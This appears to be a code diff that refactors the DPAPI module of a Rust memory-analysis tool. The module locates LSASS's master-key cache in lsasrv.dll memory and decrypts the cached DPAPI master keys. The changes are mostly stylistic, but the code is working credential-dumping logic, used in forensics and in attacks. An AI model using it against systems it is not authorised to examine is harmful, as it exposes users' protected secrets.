@@ -1,9 +1,12 @@
 use crate::error::Result;
 use crate::lsass::crypto::{self, CryptoKeys};
 use crate::lsass::patterns;
-use crate::lsass::types::{Arch, DpapiCredential, read_ptr, is_valid_user_ptr, walk_list, read_ptr_from_buf, scan_data_for_list_head};
+use crate::lsass::types::{
+    Arch, DpapiCredential, is_valid_user_ptr, read_ptr, read_ptr_from_buf, scan_data_for_list_head,
+    walk_list,
+};
 use crate::memory::{PhysicalMemory, VirtualMemory};
-use crate::paging::translate::{PageTableWalker, PaePageTableWalker};
+use crate::paging::translate::{PaePageTableWalker, PageTableWalker};
 use crate::pe::parser::PeHeaders;
 
 /// Per-arch offsets for KIWI_MASTERKEY_CACHE_ENTRY.
@@ -59,7 +62,7 @@ pub fn extract_dpapi_credentials_arch(
     // Try .text pattern scan first, then LEA/abs-to-data scan, then .data section scan
     let list_addr = match pe.find_section(".text") {
         Some(text) => {
-            let text_base = lsasrv_base + text.virtual_address as u64;
+            let text_base = lsasrv_base + u64::from(text.virtual_address);
             match patterns::find_pattern(
                 vmem,
                 text_base,
@@ -71,16 +74,12 @@ pub fn extract_dpapi_credentials_arch(
                     resolve_list_addr(vmem, &pe, lsasrv_base, pattern_addr, arch)?
                 }
                 Err(e) => {
-                    log::debug!(
-                        "DPAPI .text pattern scan failed ({}), trying instruction scan",
-                        e
-                    );
+                    log::debug!("DPAPI .text pattern scan failed ({e}), trying instruction scan");
                     match find_dpapi_list_via_insn_scan(vmem, &pe, lsasrv_base, offsets, arch) {
                         Ok(addr) => addr,
                         Err(e2) => {
                             log::debug!(
-                                "DPAPI instruction scan failed ({}), trying .data fallback",
-                                e2
+                                "DPAPI instruction scan failed ({e2}), trying .data fallback"
                             );
                             find_dpapi_list_in_data(vmem, &pe, lsasrv_base, offsets, arch)?
                         }
@@ -91,7 +90,7 @@ pub fn extract_dpapi_credentials_arch(
         None => find_dpapi_list_in_data(vmem, &pe, lsasrv_base, offsets, arch)?,
     };
 
-    log::info!("DPAPI g_MasterKeyCacheList at 0x{:x} (arch={:?})", list_addr, arch);
+    log::info!("DPAPI g_MasterKeyCacheList at 0x{list_addr:x} (arch={arch:?})");
     walk_masterkey_list(vmem, list_addr, keys, offsets, arch)
 }
 
@@ -107,10 +106,12 @@ fn resolve_list_addr(
         Arch::X64 => patterns::find_list_via_lea(vmem, pattern_addr, "g_MasterKeyCacheList"),
         Arch::X86 => {
             let ds = pe.find_section(".data").ok_or_else(|| {
-                crate::error::VmkatzError::PatternNotFound(".data section in lsasrv.dll".to_string())
+                crate::error::VmkatzError::PatternNotFound(
+                    ".data section in lsasrv.dll".to_string(),
+                )
             })?;
-            let data_base = dll_base + ds.virtual_address as u64;
-            let data_end = data_base + ds.virtual_size as u64;
+            let data_base = dll_base + u64::from(ds.virtual_address);
+            let data_end = data_base + u64::from(ds.virtual_size);
             patterns::find_list_via_abs(vmem, pattern_addr, dll_base, data_base, data_end, "dpapi")
         }
     }
@@ -154,7 +155,7 @@ fn read_and_decrypt_entry(
     if guid_bytes.iter().all(|&b| b == 0) {
         return None;
     }
-    let guid = format_guid(&guid_bytes);
+    let guid = crate::utils::format_guid(&guid_bytes);
 
     let enc_key = vmem
         .read_virt_bytes(entry_addr + offsets.key_data, key_size as usize)
@@ -164,18 +165,13 @@ fn read_and_decrypt_entry(
     let dec_key = match crypto::decrypt_credential(keys, &enc_key) {
         Ok(k) => k,
         Err(e) => {
-            log::debug!("DPAPI: failed to decrypt key for GUID={}: {}", guid, e);
+            log::debug!("DPAPI: failed to decrypt key for GUID={guid}: {e}");
             return None;
         }
     };
 
     let sha1 = sha1_digest(&dec_key);
-    log::debug!(
-        "DPAPI: LUID=0x{:x} GUID={} key_size={}",
-        luid,
-        guid,
-        key_size
-    );
+    log::debug!("DPAPI: LUID=0x{luid:x} GUID={guid} key_size={key_size}");
     Some((
         luid,
         DpapiCredential {
@@ -205,19 +201,18 @@ fn find_dpapi_list_via_insn_scan(
         crate::error::VmkatzError::PatternNotFound(".data section in lsasrv.dll".to_string())
     })?;
 
-    let text_base = lsasrv_base + text.virtual_address as u64;
+    let text_base = lsasrv_base + u64::from(text.virtual_address);
     let text_size = text.virtual_size as usize;
-    let data_base = lsasrv_base + data_sec.virtual_address as u64;
-    let data_end = data_base + data_sec.virtual_size as u64;
+    let data_base = lsasrv_base + u64::from(data_sec.virtual_address);
+    let data_end = data_base + u64::from(data_sec.virtual_size);
 
     let chunk_size = 0x10000usize;
     let mut candidates = Vec::new();
 
     for chunk_off in (0..text_size).step_by(chunk_size) {
         let read_size = std::cmp::min(chunk_size + 16, text_size - chunk_off);
-        let chunk = match vmem.read_virt_bytes(text_base + chunk_off as u64, read_size) {
-            Ok(d) => d,
-            Err(_) => continue,
+        let Ok(chunk) = vmem.read_virt_bytes(text_base + chunk_off as u64, read_size) else {
+            continue;
         };
 
         match arch {
@@ -242,7 +237,7 @@ fn find_dpapi_list_via_insn_scan(
                         chunk[i + 6],
                     ]);
                     let rip = text_base + (chunk_off + i) as u64 + 7;
-                    let target = (rip as i64 + disp as i64) as u64;
+                    let target = (rip as i64 + i64::from(disp)) as u64;
                     if target >= data_base && target < data_end {
                         candidates.push(target);
                     }
@@ -261,12 +256,12 @@ fn find_dpapi_list_via_insn_scan(
                     if !is_abs || abs_off + 4 > chunk.len() {
                         continue;
                     }
-                    let target = u32::from_le_bytes([
+                    let target = u64::from(u32::from_le_bytes([
                         chunk[abs_off],
                         chunk[abs_off + 1],
                         chunk[abs_off + 2],
                         chunk[abs_off + 3],
-                    ]) as u64;
+                    ]));
                     if target >= data_base && target < data_end {
                         candidates.push(target);
                     }
@@ -285,10 +280,7 @@ fn find_dpapi_list_via_insn_scan(
 
     for target in &candidates {
         if validate_dpapi_list_head(vmem, *target, lsasrv_base, offsets, arch) {
-            log::info!(
-                "DPAPI instruction scan: found g_MasterKeyCacheList at 0x{:x}",
-                target
-            );
+            log::info!("DPAPI instruction scan: found g_MasterKeyCacheList at 0x{target:x}");
             return Ok(*target);
         }
     }
@@ -307,11 +299,18 @@ fn find_dpapi_list_in_data(
     arch: Arch,
 ) -> Result<u64> {
     scan_data_for_list_head(
-        vmem, pe, lsasrv_base, arch, 0x20000, "lsasrv.dll", 0x200000,
-        false, "g_MasterKeyCacheList",
+        vmem,
+        pe,
+        lsasrv_base,
+        arch,
+        0x20000,
+        "lsasrv.dll",
+        0x200000,
+        false,
+        "g_MasterKeyCacheList",
         |_flink, list_addr| {
             if validate_dpapi_list_head(vmem, list_addr, lsasrv_base, offsets, arch) {
-                log::debug!("DPAPI: found g_MasterKeyCacheList at 0x{:x}", list_addr);
+                log::debug!("DPAPI: found g_MasterKeyCacheList at 0x{list_addr:x}");
                 return true;
             }
             false
@@ -327,9 +326,8 @@ fn validate_dpapi_list_head(
     offsets: &DpapiOffsets,
     arch: Arch,
 ) -> bool {
-    let flink = match read_ptr(vmem, head, arch) {
-        Ok(f) => f,
-        Err(_) => return false,
+    let Ok(flink) = read_ptr(vmem, head, arch) else {
+        return false;
     };
     if !is_valid_user_ptr(flink, arch) || flink == head {
         return false;
@@ -339,33 +337,29 @@ fn validate_dpapi_list_head(
         return false;
     }
     // Entry's Blink should point back to head
-    let entry_blink = match read_ptr(vmem, flink + arch.ptr_size(), arch) {
-        Ok(b) => b,
-        Err(_) => return false,
+    let Ok(entry_blink) = read_ptr(vmem, flink + arch.ptr_size(), arch) else {
+        return false;
     };
     if entry_blink != head {
         return false;
     }
     // LUID should be reasonable (fits in 32 bits)
-    let luid = match vmem.read_virt_u64(flink + offsets.luid) {
-        Ok(l) => l,
-        Err(_) => return false,
+    let Ok(luid) = vmem.read_virt_u64(flink + offsets.luid) else {
+        return false;
     };
     if luid > 0xFFFF_FFFF {
         return false;
     }
     // key_size should be 32, 48, or 64
-    let key_size = match vmem.read_virt_u32(flink + offsets.key_size) {
-        Ok(k) => k,
-        Err(_) => return false,
+    let Ok(key_size) = vmem.read_virt_u32(flink + offsets.key_size) else {
+        return false;
     };
     if !matches!(key_size, 32 | 48 | 64) {
         return false;
     }
     // GUID should not be all zeros
-    let guid_bytes = match vmem.read_virt_bytes(flink + offsets.guid, 16) {
-        Ok(g) => g,
-        Err(_) => return false,
+    let Ok(guid_bytes) = vmem.read_virt_bytes(flink + offsets.guid, 16) else {
+        return false;
     };
     if guid_bytes.iter().all(|&b| b == 0) {
         return false;
@@ -409,9 +403,8 @@ pub fn extract_dpapi_physical_scan<P: PhysicalMemory>(
         }
         pages_scanned += 1;
 
-        let page_data = match phys.read_phys_bytes(mapping.paddr, 0x1000) {
-            Ok(d) => d,
-            Err(_) => return,
+        let Ok(page_data) = phys.read_phys_bytes(mapping.paddr, 0x1000) else {
+            return;
         };
         if page_data.iter().all(|&b| b == 0) {
             return;
@@ -443,9 +436,8 @@ pub fn extract_dpapi_physical_scan<P: PhysicalMemory>(
         if !matches!(key_size, 32 | 48 | 64) {
             continue;
         }
-        let guid_bytes = match vmem.read_virt_bytes(*vaddr + offsets.guid, 16) {
-            Ok(g) => g,
-            Err(_) => continue,
+        let Ok(guid_bytes) = vmem.read_virt_bytes(*vaddr + offsets.guid, 16) else {
+            continue;
         };
         if guid_bytes.iter().all(|&b| b == 0) {
             continue;
@@ -457,14 +449,13 @@ pub fn extract_dpapi_physical_scan<P: PhysicalMemory>(
         {
             continue;
         }
-        let guid = format_guid(&guid_bytes);
+        let guid = crate::utils::format_guid(&guid_bytes);
         if !seen_guids.insert(guid.clone()) {
             continue;
         }
 
-        let enc_key = match vmem.read_virt_bytes(*vaddr + offsets.key_data, key_size as usize) {
-            Ok(k) => k,
-            Err(_) => continue,
+        let Ok(enc_key) = vmem.read_virt_bytes(*vaddr + offsets.key_data, key_size as usize) else {
+            continue;
         };
         // Encrypted key should not be all zeros
         if enc_key.iter().all(|&b| b == 0) {
@@ -472,18 +463,12 @@ pub fn extract_dpapi_physical_scan<P: PhysicalMemory>(
         }
 
         // Decrypt with 3DES/AES
-        let dec_key = match crypto::decrypt_credential(keys, &enc_key) {
-            Ok(k) => k,
-            Err(_) => continue,
+        let Ok(dec_key) = crypto::decrypt_credential(keys, &enc_key) else {
+            continue;
         };
 
         let sha1 = sha1_digest(&dec_key);
-        log::info!(
-            "DPAPI phys-scan: LUID=0x{:x} GUID={} key_size={}",
-            luid,
-            guid,
-            key_size
-        );
+        log::info!("DPAPI phys-scan: LUID=0x{luid:x} GUID={guid} key_size={key_size}");
         results.push((
             luid,
             DpapiCredential {
@@ -553,9 +538,8 @@ pub fn extract_dpapi_vmem_scan(
         if chunk_size < min_entry {
             continue;
         }
-        let data = match vmem.read_virt_bytes(base, chunk_size) {
-            Ok(d) => d,
-            Err(_) => continue,
+        let Ok(data) = vmem.read_virt_bytes(base, chunk_size) else {
+            continue;
         };
         total_scanned += size;
 
@@ -569,7 +553,9 @@ pub fn extract_dpapi_vmem_scan(
 
             // LUID
             let luid_off = off + offsets.luid as usize;
-            if luid_off + 8 > data.len() { continue; }
+            if luid_off + 8 > data.len() {
+                continue;
+            }
             let luid = super::types::read_u64_le(&data, luid_off).unwrap_or(0);
             if luid == 0 || luid > 0xFFFF_FFFF {
                 continue;
@@ -577,7 +563,9 @@ pub fn extract_dpapi_vmem_scan(
 
             // GUID
             let guid_off = off + offsets.guid as usize;
-            if guid_off + 16 > data.len() { continue; }
+            if guid_off + 16 > data.len() {
+                continue;
+            }
             let guid_bytes = &data[guid_off..guid_off + 16];
             if !validate_dpapi_guid(guid_bytes) {
                 continue;
@@ -585,7 +573,9 @@ pub fn extract_dpapi_vmem_scan(
 
             // key_size
             let ks_off = off + offsets.key_size as usize;
-            if ks_off + 4 > data.len() { continue; }
+            if ks_off + 4 > data.len() {
+                continue;
+            }
             let key_size = super::types::read_u32_le(&data, ks_off).unwrap_or(0);
             if !matches!(key_size, 32 | 48 | 64) {
                 continue;
@@ -593,30 +583,26 @@ pub fn extract_dpapi_vmem_scan(
 
             candidates += 1;
             let vaddr = base + off as u64;
-            let guid = format_guid(guid_bytes);
+            let guid = crate::utils::format_guid(guid_bytes);
             if !seen_guids.insert(guid.clone()) {
                 continue;
             }
 
             // Read encrypted key from virtual memory (may cross page boundary)
-            let enc_key = match vmem.read_virt_bytes(vaddr + offsets.key_data, key_size as usize) {
-                Ok(k) => k,
-                Err(_) => continue,
+            let Ok(enc_key) = vmem.read_virt_bytes(vaddr + offsets.key_data, key_size as usize)
+            else {
+                continue;
             };
             if enc_key.iter().all(|&b| b == 0) {
                 continue;
             }
 
-            let dec_key = match crypto::decrypt_credential(keys, &enc_key) {
-                Ok(k) => k,
-                Err(_) => continue,
+            let Ok(dec_key) = crypto::decrypt_credential(keys, &enc_key) else {
+                continue;
             };
 
             let sha1 = sha1_digest(&dec_key);
-            log::info!(
-                "DPAPI vmem-scan: LUID=0x{:x} GUID={} key_size={}",
-                luid, guid, key_size
-            );
+            log::info!("DPAPI vmem-scan: LUID=0x{luid:x} GUID={guid} key_size={key_size}");
             results.push((
                 luid,
                 DpapiCredential {
@@ -630,7 +616,9 @@ pub fn extract_dpapi_vmem_scan(
 
     log::info!(
         "DPAPI vmem scan: scanned {} bytes, {} candidates, {} entries extracted",
-        total_scanned, candidates, results.len()
+        total_scanned,
+        candidates,
+        results.len()
     );
     results
 }
@@ -638,7 +626,7 @@ pub fn extract_dpapi_vmem_scan(
 /// Check if a page region at `off` matches a DPAPI master key cache entry signature.
 ///
 /// Uses x64 offsets (only called from physical scan / carve mode which are x64-only).
-pub(crate) fn try_dpapi_entry_match(page: &[u8], off: usize) -> bool {
+pub fn try_dpapi_entry_match(page: &[u8], off: usize) -> bool {
     if off + 0x74 > page.len() {
         return false;
     }
@@ -686,7 +674,11 @@ pub(crate) fn try_dpapi_entry_match(page: &[u8], off: usize) -> bool {
 /// Validate GUID bytes from a candidate DPAPI entry.
 /// Real GUIDs (v4 random) have high entropy and non-zero middle fields.
 fn validate_dpapi_guid(guid: &[u8]) -> bool {
-    debug_assert!(guid.len() == 16);
+    // A GUID is exactly 16 bytes; reject anything else (also keeps the fixed-offset
+    // reads below in bounds in release, where debug_assert would be stripped).
+    if guid.len() != 16 {
+        return false;
+    }
 
     // D1 (first u32) non-zero
     let d1 = u32::from_le_bytes(guid[0..4].try_into().unwrap());
@@ -701,7 +693,10 @@ fn validate_dpapi_guid(guid: &[u8]) -> bool {
         return false;
     }
     // Not all ASCII printable (filters text strings mistaken for GUIDs)
-    if guid.iter().all(|&b| b.is_ascii_graphic() || b == 0 || b == b' ') {
+    if guid
+        .iter()
+        .all(|&b| b.is_ascii_graphic() || b == 0 || b == b' ')
+    {
         return false;
     }
     // Entropy: random GUIDs have >=8 unique bytes out of 16 (v4 has 122 random bits).
@@ -717,7 +712,7 @@ fn validate_dpapi_guid(guid: &[u8]) -> bool {
 /// Used by carve mode to extract DPAPI entries directly from physical pages.
 /// All fields are read from page bytes at fixed x64 offsets -- no virtual memory needed.
 #[cfg(feature = "carve")]
-pub(crate) fn extract_dpapi_from_raw_page(
+pub fn extract_dpapi_from_raw_page(
     page: &[u8],
     off: usize,
     keys: &CryptoKeys,
@@ -735,11 +730,10 @@ pub(crate) fn extract_dpapi_from_raw_page(
     if !validate_dpapi_guid(guid_bytes) {
         return None;
     }
-    let guid = format_guid(guid_bytes);
+    let guid = crate::utils::format_guid(guid_bytes);
 
     // key_size must be 64 (DPAPI master keys are SHA-512 derived)
-    let key_size =
-        u32::from_le_bytes(page[off + 0x30..off + 0x34].try_into().ok()?);
+    let key_size = u32::from_le_bytes(page[off + 0x30..off + 0x34].try_into().ok()?);
     if key_size != 64 {
         return None;
     }
@@ -774,27 +768,3 @@ pub(crate) fn extract_dpapi_from_raw_page(
 
 /// SHA-1 digest for computing sha1_masterkey.
 use crate::utils::sha1_digest;
-
-/// Format a 16-byte GUID as "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx".
-fn format_guid(bytes: &[u8]) -> String {
-    if bytes.len() < 16 {
-        return hex::encode(bytes);
-    }
-    let d1 = u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]);
-    let d2 = u16::from_le_bytes([bytes[4], bytes[5]]);
-    let d3 = u16::from_le_bytes([bytes[6], bytes[7]]);
-    format!(
-        "{:08x}-{:04x}-{:04x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
-        d1,
-        d2,
-        d3,
-        bytes[8],
-        bytes[9],
-        bytes[10],
-        bytes[11],
-        bytes[12],
-        bytes[13],
-        bytes[14],
-        bytes[15],
-    )
-}
